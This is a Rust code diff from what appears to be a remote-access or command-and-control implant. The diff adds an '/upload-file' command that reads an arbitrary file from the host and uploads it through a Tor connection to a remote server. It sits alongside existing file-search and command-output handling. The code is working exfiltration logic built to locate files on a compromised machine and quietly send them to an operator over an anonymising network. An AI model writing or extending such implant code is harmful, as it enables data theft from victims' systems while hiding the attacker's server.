@@ -201,11 +201,63 @@ async fn main() {
         for message in messages {
 
 
-            let mut interpreted = (|| {
+            let mut interpreted = (async || {
+                if message.request.starts_with("/upload-file|") {
+                    match helpers::parse_upload_command(&message.request) {
+                        Ok((file_path, file_id)) => {
+                            let file_contents = match tokio::fs::read(&file_path).await {
+                                Ok(contents) => contents,
+                                Err(e) => {
+                                    return format!("failed to read file at '{}' because: {}", &file_path, e);
+                                }
+                            };
+                            
+                            let mut upload_stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
+                                Ok(s) => s,
+                                Err(e) => {
+                                    return format!("failed to connect to server: {}", e);
+                                }
+                            };
+                            
+                            let endpoint = format!("/v1/upload/{}", file_id);
+                            let content_length = file_contents.len().to_string();
+                            let mut req_buff = format!("PUT {} HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: {}\r\n\r\n", endpoint, content_length).into_bytes();
+                            req_buff.extend(file_contents);
+                            
+                            if let Err(e) = upload_stream.write_all(&req_buff).await {
+                                return format!("failed to write request: {}", e);
+                            }
+                            if let Err(e) = upload_stream.flush().await {
+                                return format!("failed to flush stream: {}", e);
+                            }
+                            
+                            let mut resp_buff = Vec::new();
+                            if let Err(e) = upload_stream.read_to_end(&mut resp_buff).await {
+                                return format!("failed to read response: {}", e);
+                            }
+                            
+                            let strresp = String::from_utf8_lossy(&resp_buff);
+                            let lines: Vec<&str> = strresp.split("\r\n").collect();
+                            if lines.is_empty() {
+                                return "empty response".to_string();
+                            }
+                            let status_line = lines[0];
+                            if status_line.contains("200 OK") {
+                                return "uploaded".to_string();
+                            } else {
+                                return format!("server returned {}", status_line);
+                            }
+                        },
+                        Err(e) => {
+                            return format!("Error parsing the command: {}", e);
+                        }
+                    }
+                }
+
                 if message.request.starts_with("/find-files") {
                     debug_println!("_> Finding files...");
 
-                    match helpers::parse_find_files_input(&message.request) {
+                    match helpers::parse_find_files_command(&message.request) {
                         Ok((path, terms)) => {
                             debug_println!("_> Path is '{}' and search terms are '{:#?}'", &path, &terms);
                             let files = helpers::find_files(path, terms);
@@ -241,7 +293,7 @@ async fn main() {
                 };
 
                 return command_output;
-            })();
+            })().await;
 
             if interpreted.len() == 0 {
                 interpreted = "[empty response]".to_string();
